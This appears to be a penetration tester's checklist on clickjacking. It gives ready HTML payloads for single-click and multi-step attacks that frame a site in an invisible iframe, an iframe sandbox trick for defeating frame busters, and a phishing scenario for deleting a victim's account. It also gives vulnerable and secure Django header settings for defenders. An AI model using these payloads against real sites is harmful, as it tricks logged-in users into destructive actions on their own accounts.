
tactic: Initial Access


**Clickjacking** is when an attacker loads a legitimate target website inside a hidden `<iframe>` overlaid on a decoy page — the victim thinks they're clicking the decoy but they're actually clicking the real site underneath, performing actions with their own authenticated session.

```
Victim sees:        [ Decoy — "Click here to claim your prize!" ]

What's underneath:  [ target.com/account/delete ] ← invisible iframe
```


---

## Injection Points

- Pages performing sensitive actions on click (delete, confirm, transfer, change email)
- Missing `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` headers
- Forms that don't require re-auth for destructive actions

---

## Checklist

- [ ]  **Check if site is frameable** — inspect response headers:

```
	X-Frame-Options: DENY / SAMEORIGIN      ← protected
	CSP: frame-ancestors 'none'             ← protected
	(header missing)                        ← vulnerable
```

- [ ]  **Identify sensitive click actions** — delete account, confirm transfer, change email, OAuth grant
- [ ]  **Build payload** 
- [ ]  **Bypass frame busters** — if target uses JS to break iframes, neutralize with `sandbox`:

html

```html
	<iframe src="https://target.com" sandbox="allow-forms"></iframe>
```

- [ ]  **Multi-step actions** — use multiple positioned `div` elements for multi-click flows

---

## Basic Payload

```html
<style>
    #target_website {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.00001;  /* set 0.5 while aligning */
        z-index: 2;
    }
    #decoy {
        position: absolute;
        z-index: 1;
        top: 450px;   /* adjust to align with target button */
        left: 60px;
    }
</style>
<body>
    <div id="decoy">Click here to claim your prize!</div>
    <iframe id="target_website" src="https://vulnerable-website.com/account/delete"></iframe>
</body>
```

---

## Multi-Step Payload

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    .firstClick, .secondClick {
        position: absolute;
        z-index: 1;
    }
    .firstClick  { top: 500px; left: 50px; }
    .secondClick { top: 290px; left: 225px; }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable-website.com/my-account"></iframe>
```

---

## Phishing Scenario

1. Attacker hosts payload on `attacker.com/prize`
2. Sends victim phishing link — _"You won a prize, click to claim!"_
3. Victim is already logged into `target.com`
4. Victim clicks the decoy — click lands on hidden iframe → action fires with victim's session
5. Account deleted / email changed — victim sees nothing

---

## White Box Testing

**Vulnerable — no framing protection:**

```python
# Django view — missing X-Frame-Options header
def delete_account(request):
    if request.method == 'POST':
        request.user.delete()
        return redirect('home')
    return render(request, 'delete.html')

# Response headers:
# Content-Type: text/html
# (X-Frame-Options missing → page is frameable)
```

**Vulnerable — header explicitly removed:**

```python
# Django has X-Frame-Options: SAMEORIGIN by default
# but developer disabled it with a decorator
@xframe_options_exempt          # ← red flag
def delete_account(request):
    ...
```

**Secure:**

```python
# Option 1 — Django middleware (set globally in settings.py)
X_FRAME_OPTIONS = 'DENY'

# Option 2 — CSP header (modern approach)
response['Content-Security-Policy'] = "frame-ancestors 'none'"
```

---

## Resources

- [PortSwigger Clickjacking](https://portswigger.net/web-security/clickjacking)
- [OWASP Clickjacking](https://owasp.org/www-community/attacks/Clickjacking)
